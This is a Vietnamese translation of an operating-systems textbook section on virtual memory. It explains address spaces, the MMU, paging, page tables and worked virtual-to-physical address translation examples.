<p>Một số phần của không gian địa chỉ ảo của process đến từ <strong>binary executable file</strong> (tệp thực thi nhị phân) mà nó đang chạy (ví dụ: phần <em>text</em> chứa các lệnh chương trình từ tệp <code>a.out</code>).<br />
Các phần khác của không gian địa chỉ ảo được tạo ra <strong>tại thời gian chạy</strong> (runtime) (ví dụ: phần <em>stack</em>).</p>
<p>Hệ điều hành triển khai virtual memory như một phần của abstraction <strong>lone view</strong> (cái nhìn riêng biệt) của process.<br />
Nghĩa là, mỗi process chỉ tương tác với bộ nhớ thông qua <strong>không gian địa chỉ ảo của riêng nó</strong>, thay vì thực tế là nhiều process đang đồng thời chia sẻ bộ nhớ vật lý (RAM) của máy tính.</p>
<p>OS cũng sử dụng cơ chế virtual memory để <strong>bảo vệ</strong> các process khỏi việc truy cập vào bộ nhớ của nhau.</p>
<p>Ví dụ, hãy xem chương trình C đơn giản sau:</p>
<pre><code class="language-c">/* a simple program */
#include &lt;stdio.h&gt;

int main(int argc, char* argv[]) {
    int x, y;

    printf(&quot;enter a value: &quot;);
    scanf(&quot;%d&quot;, &amp;y);

    if (y &gt; 10) {
        x = y;
    } else {
        x = 6;
    }
    printf(&quot;x is %d\n&quot;, x);

    return 0;
}
</code></pre>
<p>Nếu hai process đồng thời thực thi chương trình này, mỗi process sẽ nhận được <strong>bản sao riêng</strong> của bộ nhớ stack như một phần của không gian địa chỉ ảo riêng biệt.<br />
Kết quả là, nếu một process thực thi <code>x = 6</code> thì điều đó <strong>không ảnh hưởng</strong> đến giá trị của <code>x</code> trong process còn lại — mỗi process có bản sao riêng của <code>x</code> trong không gian địa chỉ ảo riêng của mình, như minh họa trong <strong>Hình 1</strong>.</p>
<p><img src="C13-OS/_images/vas.png" alt="virtual address space" /></p>
<p><strong>Hình 1.</strong> Hai lần thực thi <code>a.out</code> tạo ra hai process, mỗi process chạy một instance độc lập của chương trình <code>a.out</code>.<br />
Mỗi process có <strong>không gian địa chỉ ảo riêng</strong>, chứa bản sao của lệnh chương trình, biến toàn cục, và vùng bộ nhớ stack và heap.<br />
Ví dụ: mỗi process có thể có một biến cục bộ <code>x</code> trong phần stack của không gian địa chỉ ảo của nó.</p>
<p>Không gian địa chỉ ảo của một process được chia thành nhiều <strong>section</strong> (phần), mỗi phần lưu trữ một loại dữ liệu khác nhau của process:</p>
<ul>
<li><strong>Phần trên cùng</strong> (ở các địa chỉ thấp nhất) được <strong>dành riêng cho OS</strong> và chỉ có thể truy cập ở <strong>kernel mode</strong>.</li>
<li><strong>Phần text</strong> và <strong>phần data</strong> của không gian địa chỉ ảo được khởi tạo từ tệp thực thi chương trình (<code>a.out</code>):
<ul>
<li><strong>Text section</strong> chứa các lệnh chương trình.</li>
<li><strong>Data section</strong> chứa các biến toàn cục (thực tế phần data được chia thành hai phần: một cho biến toàn cục đã khởi tạo và một cho biến toàn cục chưa khởi tạo).</li>
</ul>
</li>
</ul>
<p><strong>Stack</strong> và <strong>heap</strong> của một process thay đổi kích thước khi process chạy:</p>
<ul>
<li><strong>Stack</strong> tăng khi process thực hiện lời gọi hàm, và giảm khi hàm trả về.</li>
<li><strong>Heap</strong> tăng khi process cấp phát bộ nhớ động (qua <code>malloc</code>), và giảm khi giải phóng bộ nhớ động (qua <code>free</code>).</li>
</ul>
<p>Thông thường, heap và stack được đặt <strong>xa nhau</strong> trong không gian địa chỉ để tối đa hóa dung lượng mà mỗi bên có thể sử dụng.<br />
Thông thường, stack nằm ở <strong>cuối không gian địa chỉ</strong> (gần địa chỉ tối đa) và <strong>tăng ngược xuống</strong> các địa chỉ thấp hơn khi thêm <strong>stack frame</strong> mới vào đỉnh stack khi có lời gọi hàm.</p>
<blockquote>
<p><strong>Về bộ nhớ Heap và Stack</strong></p>
</blockquote>
<p>Tổng dung lượng thực tế của heap và stack <strong>không</strong> thay đổi ở mỗi lần gọi <code>malloc</code>/<code>free</code> hoặc mỗi lần gọi/trả về hàm.<br />
Thay vào đó, các thao tác này thường chỉ thay đổi lượng bộ nhớ heap và stack <strong>đang được sử dụng</strong> trong phần dung lượng đã được cấp phát.</p>
<p>Tuy nhiên, đôi khi các thao tác này <strong>có thể</strong> dẫn đến thay đổi tổng dung lượng heap hoặc stack.</p>
<p>OS chịu trách nhiệm quản lý <strong>virtual address space</strong> của process, bao gồm việc thay đổi tổng dung lượng heap và stack.<br />
Các system call <code>brk</code>, <code>sbrk</code> hoặc <code>mmap</code> có thể được dùng để yêu cầu OS thay đổi tổng dung lượng bộ nhớ heap.</p>
<p>Lập trình viên C thường <strong>không</strong> gọi trực tiếp các system call này.<br />
Thay vào đó, họ gọi <strong>hàm thư viện C chuẩn</strong> <code>malloc</code> (và <code>free</code>) để cấp phát (và giải phóng) bộ nhớ heap.<br />
Bên trong, <strong>user-level heap manager</strong> (bộ quản lý heap ở mức người dùng) của thư viện C chuẩn có thể gọi một trong các system call này để yêu cầu OS thay đổi kích thước bộ nhớ heap nhằm đáp ứng yêu cầu <code>malloc</code>.</p>
<h3 id="1331-Địa-chỉ-bộ-nhớ-memory-addresses"><a class="header" href="#1331-Địa-chỉ-bộ-nhớ-memory-addresses">13.3.1. Địa chỉ bộ nhớ (Memory Addresses)</a></h3>
<p>Vì các <strong>process</strong> (tiến trình) hoạt động trong <strong>virtual address space</strong> (không gian địa chỉ ảo) riêng của chúng, nên <strong>operating system</strong> (OS – hệ điều hành) phải phân biệt rõ giữa hai loại địa chỉ bộ nhớ:</p>
<ul>
<li><strong>Virtual address</strong>: tham chiếu đến vị trí lưu trữ trong không gian địa chỉ ảo của một process.</li>
<li><strong>Physical address</strong>: tham chiếu đến vị trí lưu trữ trong <strong>physical memory</strong> (bộ nhớ vật lý – RAM).</li>
</ul>
<h4 id="physical-memory-ram-và-physical-memory-addresses"><a class="header" href="#physical-memory-ram-và-physical-memory-addresses">Physical Memory (RAM) và Physical Memory Addresses</a></h4>
<p>Như đã đề cập trong <a href="C13-OS/../C11-MemHierarchy/index.html#_storage_and_the_memory_hierarchy">Chương Storage and Memory Hierarchy</a>, <strong>physical memory</strong> (RAM) có thể được xem như một mảng các byte có thể địa chỉ hóa, với địa chỉ từ <code>0</code> đến giá trị địa chỉ tối đa phụ thuộc vào tổng dung lượng RAM.<br />
Ví dụ: trong một hệ thống có 2 gigabyte (GB) RAM, địa chỉ bộ nhớ vật lý sẽ từ <code>0</code> đến <code>2^31 - 1</code> (1 GB = <code>2^30</code> byte, nên 2 GB = <code>2^31</code> byte).</p>
<p>Để CPU chạy một chương trình, <strong>instructions</strong> (lệnh) và <strong>data</strong> (dữ liệu) của chương trình phải được OS nạp vào RAM; CPU không thể truy cập trực tiếp các thiết bị lưu trữ khác (ví dụ: ổ đĩa).<br />
OS quản lý RAM và quyết định vị trí nào trong RAM sẽ lưu nội dung không gian địa chỉ ảo của một process.</p>
<p>Ví dụ: nếu hai process P1 và P2 cùng chạy <a href="C13-OS/vm.html#exampleprog">chương trình ví dụ</a> ở trên, thì P1 và P2 sẽ có <strong>bản sao riêng</strong> của biến <code>x</code>, mỗi bản được lưu ở một vị trí khác nhau trong RAM.<br />
Nói cách khác, <code>x</code> của P1 và <code>x</code> của P2 có <strong>physical address</strong> khác nhau.<br />
Nếu OS gán cùng một physical address cho biến <code>x</code> của cả P1 và P2, thì việc P1 gán <code>x = 6</code> sẽ làm thay đổi giá trị <code>x</code> của P2, vi phạm nguyên tắc <strong>private virtual address space</strong> (không gian địa chỉ ảo riêng cho từng process).</p>
<p>Tại bất kỳ thời điểm nào, OS lưu trong RAM nội dung không gian địa chỉ của nhiều process, cũng như code OS có thể được <strong>map</strong> vào không gian địa chỉ ảo của mọi process (code OS thường được nạp bắt đầu từ địa chỉ <code>0x0</code> của RAM).</p>
<p><strong>Hình 2</strong> minh họa ví dụ OS và ba process (P1, P2, P3) được nạp vào RAM.<br />
Mỗi process có vùng lưu trữ vật lý riêng cho nội dung không gian địa chỉ của nó (ngay cả khi P1 và P2 chạy cùng một chương trình, chúng vẫn có vùng lưu trữ vật lý riêng cho biến <code>x</code>).</p>
<p><img src="C13-OS/_images/pa.png" alt="physical addresses" /></p>
<p><strong>Hình 2.</strong> Ví dụ nội dung RAM, với OS được nạp tại địa chỉ <code>0x0</code> và các process được nạp tại các địa chỉ bộ nhớ vật lý khác nhau trong RAM. Nếu P1 và P2 chạy cùng một <code>a.out</code>, physical address của <code>x</code> trong P1 sẽ khác với physical address của <code>x</code> trong P2.</p>
<h4 id="virtual-memory-và-virtual-addresses"><a class="header" href="#virtual-memory-và-virtual-addresses">Virtual Memory và Virtual Addresses</a></h4>
<p><strong>Virtual memory</strong> là góc nhìn của từng process về không gian bộ nhớ của nó, và <strong>virtual address</strong> là địa chỉ trong góc nhìn đó.</p>
<p>Nếu hai process chạy cùng một <strong>binary executable</strong> (tệp thực thi nhị phân), chúng sẽ có <strong>cùng virtual address</strong> cho code hàm và biến toàn cục trong không gian địa chỉ của mình (các địa chỉ ảo của vùng cấp phát động trên heap và biến cục bộ trên stack có thể khác nhau đôi chút do sự khác biệt tại runtime giữa hai lần thực thi).</p>
<p>Nói cách khác, cả hai process sẽ có cùng virtual address cho vị trí hàm <code>main</code>, và cùng virtual address cho vị trí biến toàn cục <code>x</code> trong không gian địa chỉ của chúng, như minh họa trong <strong>Hình 3</strong>.</p>
<p><img src="C13-OS/_images/va.png" alt="virtual addresses for two processes running the same a.out" /></p>
<p><strong>Hình 3.</strong> Ví dụ nội dung virtual memory của hai process chạy cùng một tệp <code>a.out</code>. P1 và P2 có cùng virtual address cho biến toàn cục <code>x</code>.</p>
<h3 id="1332-chuyển-đổi-địa-chỉ-ảo-sang-địa-chỉ-vật-lý-virtual-address-to-physical-address-translation"><a class="header" href="#1332-chuyển-đổi-địa-chỉ-ảo-sang-địa-chỉ-vật-lý-virtual-address-to-physical-address-translation">13.3.2. Chuyển đổi địa chỉ ảo sang địa chỉ vật lý (Virtual Address to Physical Address Translation)</a></h3>
<p><strong>Assembly</strong> và <strong>machine code</strong> của một chương trình tham chiếu đến <strong>virtual address</strong>.<br />
Do đó, nếu hai process thực thi cùng một chương trình <code>a.out</code>, CPU sẽ chạy các lệnh với <strong>virtual address giống hệt nhau</strong> để truy cập các phần tương ứng trong hai không gian địa chỉ ảo riêng biệt của chúng.</p>
<p>Ví dụ: giả sử <code>x</code> nằm tại virtual address <code>0x24100</code>, thì lệnh assembly để gán <code>x = 6</code> có thể như sau:</p>
<pre><code>movl $0x24100, %eax    # nạp 0x24100 vào thanh ghi eax
movl $6, (%eax)        # lưu giá trị 6 vào địa chỉ bộ nhớ 0x24100
</code></pre>
<p>Tại runtime, OS sẽ nạp biến <code>x</code> của mỗi process vào <strong>physical address</strong> khác nhau (tức là ở các vị trí khác nhau trong RAM).<br />
Điều này có nghĩa là bất cứ khi nào CPU thực thi lệnh load hoặc store tới bộ nhớ với virtual address, địa chỉ ảo này phải được <strong>dịch</strong> sang physical address tương ứng trong RAM trước khi đọc hoặc ghi dữ liệu.</p>
<p>Vì virtual memory là một abstraction quan trọng và cốt lõi do OS triển khai, nên <strong>processor</strong> (bộ xử lý) thường cung cấp một số hỗ trợ phần cứng cho virtual memory.<br />
OS có thể tận dụng hỗ trợ phần cứng này để thực hiện việc dịch địa chỉ từ ảo sang vật lý nhanh chóng, tránh việc phải <strong>trap</strong> (ngắt) về OS để xử lý từng lần dịch địa chỉ.</p>
<p>Một OS cụ thể sẽ quyết định mức độ sử dụng hỗ trợ phần cứng cho <strong>paging</strong> (phân trang) trong việc triển khai virtual memory.<br />
Thường tồn tại sự đánh đổi giữa <strong>tốc độ</strong> và <strong>tính linh hoạt</strong> khi lựa chọn giữa tính năng được triển khai bằng phần cứng và tính năng được triển khai bằng phần mềm.</p>
<p><strong>Memory Management Unit</strong> (MMU – đơn vị quản lý bộ nhớ) là phần phần cứng của máy tính thực hiện việc dịch địa chỉ.<br />
MMU và OS phối hợp để dịch địa chỉ ảo sang địa chỉ vật lý khi ứng dụng truy cập bộ nhớ.<br />
Tỷ lệ phân chia công việc giữa phần cứng và phần mềm phụ thuộc vào sự kết hợp cụ thể giữa phần cứng và OS.</p>
<p>Ở mức đầy đủ nhất, phần cứng MMU thực hiện toàn bộ quá trình dịch: nhận một virtual address từ CPU và chuyển nó thành physical address để truy cập RAM (như minh họa trong <strong>Hình 4</strong>).</p>
<p>Bất kể mức độ hỗ trợ phần cứng cho virtual memory đến đâu, vẫn sẽ có một số phép dịch địa chỉ ảo–vật lý mà OS phải xử lý.<br />
Trong phần thảo luận này, chúng ta giả định một MMU hoàn chỉnh, giúp giảm thiểu tối đa sự can thiệp của OS trong quá trình dịch địa chỉ.</p>
<p><img src="C13-OS/_images/mmu.png" alt="mmu maps virtual addresses to physical addresses" /></p>
<p><strong>Hình 4.</strong> <strong>Memory Management Unit</strong> (MMU – đơn vị quản lý bộ nhớ) ánh xạ địa chỉ ảo (<strong>virtual address</strong>) sang địa chỉ vật lý (<strong>physical address</strong>).<br />
Virtual address được sử dụng trong các lệnh do CPU thực thi.<br />
Khi CPU cần nạp dữ liệu từ bộ nhớ vật lý, virtual address trước tiên sẽ được MMU dịch sang physical address, và địa chỉ vật lý này sẽ được dùng để truy cập RAM.</p>
<p>OS duy trì <strong>bảng ánh xạ bộ nhớ ảo</strong> cho từng process để đảm bảo có thể dịch chính xác địa chỉ ảo sang địa chỉ vật lý cho bất kỳ process nào đang chạy trên CPU.<br />
Trong quá trình <strong>context switch</strong> (chuyển ngữ cảnh), OS sẽ cập nhật phần cứng MMU để tham chiếu tới bảng ánh xạ bộ nhớ ảo–vật lý của process vừa được chuyển vào CPU.</p>
<p>OS bảo vệ các process khỏi việc truy cập vào không gian bộ nhớ của nhau bằng cách hoán đổi trạng thái ánh xạ địa chỉ của từng process trong mỗi lần context switch — việc hoán đổi này đảm bảo rằng virtual address của một process sẽ không ánh xạ tới physical address đang lưu trữ không gian địa chỉ ảo của process khác.</p>
<h3 id="1333-phân-trang-paging"><a class="header" href="#1333-phân-trang-paging">13.3.3. Phân trang (Paging)</a></h3>
<p>Mặc dù qua nhiều năm đã có nhiều hệ thống bộ nhớ ảo khác nhau được đề xuất, <strong>paging</strong> hiện là cách triển khai bộ nhớ ảo được sử dụng rộng rãi nhất.<br />
Trong một hệ thống <strong>paged virtual memory</strong> (bộ nhớ ảo phân trang), OS chia không gian địa chỉ ảo của mỗi process thành các khối có kích thước cố định gọi là <strong>page</strong> (trang).<br />
OS định nghĩa kích thước page cho hệ thống.<br />
Ngày nay, trong các hệ điều hành đa dụng, kích thước page thường là vài kilobyte — 4 KB (4.096 byte) là kích thước mặc định trên nhiều hệ thống.</p>
<p>Tương tự, OS cũng chia bộ nhớ vật lý thành các khối có kích thước bằng page, gọi là <strong>frame</strong> (khung).<br />
Vì page và frame có cùng kích thước, nên bất kỳ page nào của bộ nhớ ảo của một process cũng có thể được lưu trữ trong bất kỳ frame nào của RAM vật lý.</p>
<p>Trong một hệ thống phân trang:</p>
<ul>
<li>Page và frame có cùng kích thước, nên bất kỳ page nào của bộ nhớ ảo cũng có thể được nạp vào (lưu tại) bất kỳ frame vật lý nào của RAM.</li>
<li>Các page của một process <strong>không cần</strong> phải được lưu trong các frame RAM liên tiếp (tức là không cần nằm ở các địa chỉ liền kề nhau trong RAM).</li>
<li>Không phải tất cả các page của không gian địa chỉ ảo đều cần được nạp vào RAM để process có thể chạy.</li>
</ul>
<p><strong>Hình 5</strong> minh họa ví dụ cách các page từ không gian địa chỉ ảo của một process có thể ánh xạ tới các frame của RAM vật lý.</p>
<p><img src="C13-OS/_images/frames.png" alt="virtual memory pages map into physical RAM frames" /></p>
<p><strong>Hình 5.</strong> Bộ nhớ ảo phân trang. Các page riêng lẻ của không gian địa chỉ ảo của một process được lưu trong các frame của RAM.<br />
Bất kỳ page nào của không gian địa chỉ ảo cũng có thể được nạp vào (lưu tại) bất kỳ frame nào của bộ nhớ vật lý.<br />
Trong ví dụ này:</p>
<ul>
<li>Virtual page 1000 của P1 được lưu tại physical frame 100, và page 500 của nó nằm ở frame 513.</li>
<li>Virtual page 1000 của P2 được lưu tại physical frame 880, và page 230 của nó nằm ở frame 102.</li>
</ul>
<h4 id="virtual-address-và-physical-address-trong-hệ-thống-phân-trang"><a class="header" href="#virtual-address-và-physical-address-trong-hệ-thống-phân-trang">Virtual Address và Physical Address trong hệ thống phân trang</a></h4>
<p>Hệ thống bộ nhớ ảo phân trang chia các bit của một virtual address thành hai phần:</p>
<ul>
<li><strong>High-order bits</strong> (các bit cao) xác định <strong>page number</strong> (số hiệu trang) mà địa chỉ ảo thuộc về.</li>
<li><strong>Low-order bits</strong> (các bit thấp) xác định <strong>byte offset</strong> (độ lệch byte) trong page (byte nào tính từ đầu trang tương ứng với địa chỉ đó).</li>
</ul>
<p>Tương tự, hệ thống phân trang chia physical address thành hai phần:</p>
<ul>
<li><strong>High-order bits</strong> xác định <strong>frame number</strong> (số hiệu khung) của bộ nhớ vật lý.</li>
<li><strong>Low-order bits</strong> xác định <strong>byte offset</strong> trong frame.</li>
</ul>
<p>Vì frame và page có cùng kích thước, nên các bit <strong>byte offset</strong> trong virtual address <strong>giống hệt</strong> các bit byte offset trong physical address sau khi dịch.<br />
Virtual address và physical address khác nhau ở các bit cao, vốn xác định <strong>virtual page number</strong> và <strong>physical frame number</strong>.</p>
<p><img src="C13-OS/_images/addrbits.png" alt="virtual and physical address bits" /></p>
<p><strong>Hình 6.</strong> Các bit địa chỉ trong <strong>virtual address</strong> và <strong>physical address</strong></p>
<p>Ví dụ, hãy xét một hệ thống (rất nhỏ) với:</p>
<ul>
<li><strong>Virtual address</strong> dài 16 bit</li>
<li><strong>Physical address</strong> dài 14 bit</li>
<li><strong>Page</strong> có kích thước 8 byte</li>
</ul>
<p>Vì kích thước page là 8 byte, nên <strong>3 bit thấp</strong> (low-order bits) của cả physical address và virtual address sẽ xác định <strong>byte offset</strong> (độ lệch byte) trong một page hoặc frame — 3 bit có thể code hóa 8 giá trị byte offset khác nhau, từ 0–7 (vì ( 2^3 = 8 )).</p>
<p>Điều này để lại:</p>
<ul>
<li><strong>13 bit cao</strong> (high-order bits) của virtual address để xác định <strong>page number</strong> (số hiệu trang)</li>
<li><strong>11 bit cao</strong> của physical address để xác định <strong>frame number</strong> (số hiệu khung)</li>
</ul>
<p>Như minh họa trong ví dụ ở <strong>Hình 7</strong>.</p>
<p><img src="C13-OS/_images/expavaaddrbits.png" alt="interpreting address bits in example" /></p>
<p><strong>Hình 7.</strong> Cách chia bit của virtual address và physical address trong một hệ thống ví dụ có virtual address 16 bit, physical address 14 bit, và kích thước page là 8 byte.</p>
<p>Trong ví dụ ở <strong>Hình 7</strong>:</p>
<ul>
<li>Virtual address <code>43357</code> (hệ thập phân) có:
<ul>
<li><strong>Byte offset</strong> là <code>5</code> (<code>0b101</code> trong nhị phân) — 3 bit thấp của địa chỉ.</li>
<li><strong>Page number</strong> là <code>5419</code> (<code>0b1010100101011</code> trong nhị phân) — 13 bit cao của địa chỉ.</li>
</ul>
</li>
</ul>
<p>Điều này có nghĩa là địa chỉ ảo này nằm ở <strong>byte thứ 5</strong> tính từ đầu của <strong>page 5419</strong>.</p>
<p>Nếu page này của bộ nhớ ảo được nạp vào <strong>frame 43</strong> (<code>0b00000101011</code>) của bộ nhớ vật lý, thì <strong>physical address</strong> sẽ là <code>349</code> (<code>0b00000101011101</code>), trong đó:</p>
<ul>
<li><strong>3 bit thấp</strong> (<code>0b101</code>) xác định byte offset.</li>
<li><strong>11 bit cao</strong> (<code>0b00000101011</code>) xác định frame number.</li>
</ul>
<p>Điều này có nghĩa là địa chỉ vật lý này nằm ở <strong>byte thứ 5</strong> tính từ đầu của <strong>frame 43</strong> trong RAM.</p>
<h4 id="page-table-cho-ánh-xạ-từ-virtual-page-sang-physical-frame"><a class="header" href="#page-table-cho-ánh-xạ-từ-virtual-page-sang-physical-frame">Page Table cho ánh xạ từ Virtual Page sang Physical Frame</a></h4>
<p>Vì mỗi page trong <strong>virtual memory space</strong> của một process có thể ánh xạ tới một frame khác nhau trong RAM, OS phải duy trì <strong>bảng ánh xạ</strong> cho từng virtual page trong không gian địa chỉ của process.</p>
<p>OS giữ một <strong>page table</strong> (bảng trang) riêng cho từng process, dùng để lưu ánh xạ từ <strong>virtual page number</strong> sang <strong>physical frame number</strong>.<br />
Page table là một <strong>data structure</strong> (cấu trúc dữ liệu) do OS triển khai và được lưu trong RAM.</p>
<p><strong>Hình 8</strong> minh họa ví dụ OS lưu page table của hai process trong RAM.<br />
Page table của mỗi process lưu ánh xạ từ các virtual page của nó sang các physical frame trong RAM, sao cho bất kỳ page nào của bộ nhớ ảo cũng có thể được lưu ở bất kỳ frame vật lý nào trong RAM.</p>
<p><img src="C13-OS/_images/pagetables.png" alt="two process's page tables stored in RAM" /></p>
<p><strong>Hình 8.</strong> Mỗi process có một page table chứa ánh xạ từ virtual page sang physical frame.<br />
Page table, được lưu trong RAM, được hệ thống dùng để dịch virtual address của process sang physical address để truy cập vị trí trong RAM.<br />
Ví dụ này cho thấy các page table riêng biệt được lưu trong RAM cho P1 và P2, mỗi bảng có ánh xạ riêng từ virtual page sang physical frame.</p>
<p>Với mỗi page của bộ nhớ ảo, page table lưu một <strong>page table entry</strong> (<strong>PTE</strong>) chứa <strong>frame number</strong> của bộ nhớ vật lý (RAM) đang lưu page ảo đó.</p>
<p>Ngoài ra, một PTE có thể chứa các thông tin khác về page ảo, bao gồm <strong>valid bit</strong> (bit hợp lệ) dùng để chỉ ra liệu PTE có lưu một ánh xạ hợp lệ hay không.<br />
Nếu valid bit của một page bằng 0, nghĩa là page đó trong không gian địa chỉ ảo của process hiện <strong>chưa được nạp</strong> vào bộ nhớ vật lý.</p>
<p><img src="C13-OS/_images/pte.png" alt="page table entry" /></p>
<p><strong>Hình 9.</strong> Một <strong>page table entry</strong> (PTE) lưu <strong>frame number</strong> (23) của frame RAM chứa page ảo.<br />
Chúng ta liệt kê frame number (23) ở dạng thập phân, mặc dù thực tế nó được code hóa ở dạng nhị phân trong PTE (<code>0...010111</code>).<br />
Valid bit bằng 1 cho biết entry này lưu một ánh xạ hợp lệ.</p>
<h4 id="sử-dụng-page-table-để-ánh-xạ-từ-virtual-address-sang-physical-address"><a class="header" href="#sử-dụng-page-table-để-ánh-xạ-từ-virtual-address-sang-physical-address">Sử dụng Page Table để ánh xạ từ Virtual Address sang Physical Address</a></h4>
<p>Có <strong>4 bước</strong> để dịch một <strong>virtual address</strong> (địa chỉ ảo) sang <strong>physical address</strong> (địa chỉ vật lý) (minh họa trong <strong>Hình 10</strong>).<br />
Tùy vào sự kết hợp cụ thể giữa <strong>OS</strong> và phần cứng, một phần hoặc toàn bộ các bước này có thể được thực hiện bởi OS hoặc phần cứng.</p>
<p>Trong phần mô tả này, ta giả định một <strong>MMU</strong> (Memory Management Unit – đơn vị quản lý bộ nhớ) đầy đủ tính năng, thực hiện càng nhiều công việc dịch địa chỉ bằng phần cứng càng tốt; tuy nhiên, trên một số hệ thống, OS có thể đảm nhận một phần các bước này.</p>
<ol>
<li>
<p><strong>MMU</strong> chia các bit của virtual address thành hai phần:</p>
<ul>
<li>Với kích thước page là ( 2^k ) byte, <strong>k bit thấp</strong> (VA bit từ (k-1) đến 0) code hóa <strong>byte offset</strong> (<em>d</em>) trong page.</li>
<li><strong>n-k bit cao</strong> (VA bit từ (n-1) đến (k)) code hóa <strong>virtual page number</strong> (<em>p</em>).</li>
</ul>
</li>
<li>
<p><strong>MMU</strong> dùng giá trị page number (<em>p</em>) làm chỉ số để truy cập <strong>PTE</strong> (Page Table Entry – mục trong bảng trang) của page <em>p</em> trong page table.<br />
Hầu hết các kiến trúc đều có <strong>page table base register</strong> (<strong>PTBR</strong>) lưu địa chỉ RAM của page table của process đang chạy.<br />
Giá trị trong PTBR được kết hợp với page number (<em>p</em>) để tính địa chỉ của PTE cho page <em>p</em>.</p>
</li>
<li>
<p>Nếu <strong>valid bit</strong> trong PTE được đặt (bằng 1), thì frame number trong PTE biểu thị một ánh xạ hợp lệ từ VA sang PA.<br />
Nếu valid bit bằng 0, sẽ xảy ra <strong>page fault</strong>, kích hoạt OS xử lý việc dịch địa chỉ này (phần xử lý page fault sẽ được bàn sau).</p>
</li>
<li>
<p><strong>MMU</strong> tạo physical address bằng cách:</p>
<ul>
<li>Lấy các bit frame number (<em>f</em>) từ PTE làm <strong>bit cao</strong>.</li>
<li>Lấy các bit page offset (<em>d</em>) từ VA làm <strong>bit thấp</strong> của physical address.</li>
</ul>
</li>
</ol>
<p><img src="C13-OS/_images/pagingxlation.png" alt="the steps of address translation using PTE" /></p>
<p><strong>Hình 10.</strong> Page table của một process được dùng để dịch từ virtual address sang physical address.<br />
<strong>PTBR</strong> lưu địa chỉ gốc của page table của process đang chạy.</p>
<h4 id="ví-dụ-Ánh-xạ-va-sang-pa-bằng-page-table"><a class="header" href="#ví-dụ-Ánh-xạ-va-sang-pa-bằng-page-table">Ví dụ: Ánh xạ VA sang PA bằng Page Table</a></h4>
<p>Xét một hệ thống phân trang (rất nhỏ) với các thông số:</p>
<ul>
<li>Kích thước page: <strong>4 byte</strong></li>
<li>Virtual address: <strong>6 bit</strong>
<ul>
<li>4 bit cao: <strong>page number</strong></li>
<li>2 bit thấp: <strong>byte offset</strong></li>
</ul>
</li>
<li>Physical address: <strong>7 bit</strong></li>
</ul>
<p>Giả sử page table của process <strong>P1</strong> trong hệ thống này như <strong>Bảng 1</strong> (giá trị ở cả dạng thập phân và nhị phân):</p>
<div class="table-wrapper"><table><thead><tr><th>Entry</th><th>Valid</th><th>Frame #</th></tr></thead><tbody>
<tr><td>0 (0b0000)</td><td>1</td><td>23 (0b10111)</td></tr>
<tr><td>1 (0b0001)</td><td>0</td><td>17 (0b10001)</td></tr>
<tr><td>2 (0b0010)</td><td>1</td><td>11 (0b01011)</td></tr>
<tr><td>3 (0b0011)</td><td>1</td><td>16 (0b10000)</td></tr>
<tr><td>4 (0b0100)</td><td>0</td><td>08 (0b01000)</td></tr>
<tr><td>5 (0b0101)</td><td>1</td><td>14 (0b01110)</td></tr>
<tr><td>...</td><td>...</td><td>...</td></tr>
<tr><td>15 (0b1111)</td><td>1</td><td>30 (0b11110)</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Page table của process P1</p>
<p>Từ ví dụ này, ta rút ra một số điểm quan trọng về kích thước địa chỉ, các thành phần của địa chỉ và việc dịch địa chỉ:</p>
<ul>
<li>
<p><strong>Kích thước (số lượng entry) của page table</strong> được xác định bởi số bit trong virtual address và kích thước page của hệ thống.<br />
4 bit cao của mỗi virtual address 6 bit xác định page number, nên có tổng cộng ( 2^4 = 16 ) page trong virtual memory.<br />
Vì page table có một entry cho mỗi virtual page, nên mỗi page table của process có 16 PTE.</p>
</li>
<li>
<p><strong>Kích thước của mỗi PTE</strong> phụ thuộc vào số bit trong physical address và kích thước page.<br />
Mỗi PTE lưu một valid bit và một physical frame number.</p>
<ul>
<li>Valid bit cần 1 bit.</li>
<li>Frame number cần 5 bit vì physical address dài 7 bit, trong đó 2 bit thấp là page offset (để địa chỉ hóa 4 byte trong mỗi page), còn lại 5 bit cao là frame number.<br />
→ Mỗi PTE cần 6 bit: 1 bit cho valid bit và 5 bit cho frame number.</li>
</ul>
</li>
<li>
<p><strong>Kích thước tối đa của virtual và physical memory</strong> được xác định bởi số bit trong địa chỉ:</p>
<ul>
<li>Virtual address dài 6 bit → có thể địa chỉ hóa ( 2^6 = 64 ) byte → mỗi process có không gian địa chỉ ảo 64 byte.</li>
<li>Physical address dài 7 bit → kích thước tối đa của physical memory là ( 2^7 = 128 ) byte.</li>
</ul>
</li>
<li>
<p><strong>Kích thước page</strong>, số bit của virtual/physical address, và page table quyết định cách ánh xạ từ VA sang PA.<br />
Ví dụ: nếu process P1 thực thi lệnh load từ virtual address <code>0b001110</code>, page table sẽ được dùng để dịch VA này sang physical address <code>0b1000010</code>, và địa chỉ này sẽ được dùng để truy cập giá trị trong RAM.</p>
</li>
</ul>
<p>Các bước dịch <strong>virtual address</strong> (VA) sang <strong>physical address</strong> (PA) như sau:</p>
<ol>
<li>
<p><strong>Tách các bit của VA</strong> thành hai phần: <strong>page number</strong> (<em>p</em>) và <strong>byte offset</strong> (<em>d</em>).</p>
<ul>
<li>4 bit cao là page number (<code>0b0011</code> hay page 3).</li>
<li>2 bit thấp là byte offset trong page (<code>0b10</code> hay byte thứ 2).</li>
</ul>
</li>
<li>
<p><strong>Dùng page number (3)</strong> làm chỉ số để truy cập <strong>page table</strong> và đọc <strong>PTE</strong> (Page Table Entry) của virtual page 3<br />
(PT[3]: <code>valid:1</code>, <code>frame#:16</code>).</p>
</li>
<li>
<p><strong>Kiểm tra valid bit</strong> để xác định ánh xạ PTE có hợp lệ hay không.<br />
Trong trường hợp này, valid bit = 1, nghĩa là PTE chứa ánh xạ hợp lệ, tức là virtual page 3 đang được lưu trong physical frame 16.</p>
</li>
<li>
<p><strong>Tạo physical address</strong> bằng cách:</p>
<ul>
<li>Lấy 5 bit frame number từ PTE làm <strong>bit cao</strong> của địa chỉ (<code>0b10000</code>).</li>
<li>Lấy 2 bit offset từ VA (<code>0b10</code>) làm <strong>bit thấp</strong>.<br />
→ Physical address là <code>0b1000010</code> (nằm ở frame 16 của RAM, byte offset 2).</li>
</ul>
</li>
</ol>
<h4 id="triển-khai-paging-paging-implementation"><a class="header" href="#triển-khai-paging-paging-implementation">Triển khai Paging (Paging Implementation)</a></h4>
<p>Hầu hết phần cứng máy tính đều hỗ trợ ở mức nào đó cho <strong>paged virtual memory</strong>, và OS cùng phần cứng phối hợp để triển khai paging trên một hệ thống cụ thể.</p>
